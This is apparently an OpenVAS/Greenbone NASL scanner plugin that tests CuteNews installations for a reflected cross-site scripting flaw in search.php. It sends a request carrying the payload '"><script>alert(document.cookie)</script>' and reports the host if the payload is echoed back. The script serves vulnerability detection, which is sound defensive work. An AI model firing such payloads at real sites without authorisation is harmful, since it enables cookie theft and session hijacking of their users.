CPE = "cpe:/a:cutephp:cutenews";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80052" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_bugtraq_id( 21233 );
	script_name( "CuteNews search.php Cross-Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2008 Justin Seitz" );
	script_family( "Web application abuses" );
	script_dependencies( "cutenews_detect.sc", "cross_site_scripting.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "cutenews/installed" );
	script_xref( name: "URL", value: "https://web.archive.org/web/20070630202012/http://www.kapda.ir/advisory-450.html" );
	script_tag( name: "solution", value: "Update to the latest version." );
	script_tag( name: "summary", value: "The remote web server contains a PHP script that is affected by a
  cross-site scripting issue.

  The version of Cutenews installed on the remote host fails to sanitize input to the 'search.php' script before
  using it to generate dynamic HTML to be returned to the user. An unauthenticated attacker can exploit this issue
  to execute a cross-site scripting attack.

  This version of Cutenews is also likely affected by other associated issues." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("url_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
host = http_host_name( dont_add_port: TRUE );
if(http_get_has_generic_xss( port: port, host: host )){
	exit( 0 );
}
attackstring = "\"><script>alert(document.cookie)</script>";
attacksploit = urlencode( str: attackstring, unreserved: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!~*'()-]/" );
attackurl = NASLString( dir, "/search.php/", attacksploit );
attackreq = http_get( item: attackurl, port: port );
attackres = http_keepalive_send_recv( port: port, data: attackreq, bodyonly: TRUE );
if(isnull( attackres )){
	exit( 0 );
}
if(ContainsString( attackres, NASLString( "action=\"", dir, "/search.php/", attackstring, "?subaction=search" ) )){
	report = http_report_vuln_url( port: port, url: attackurl );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

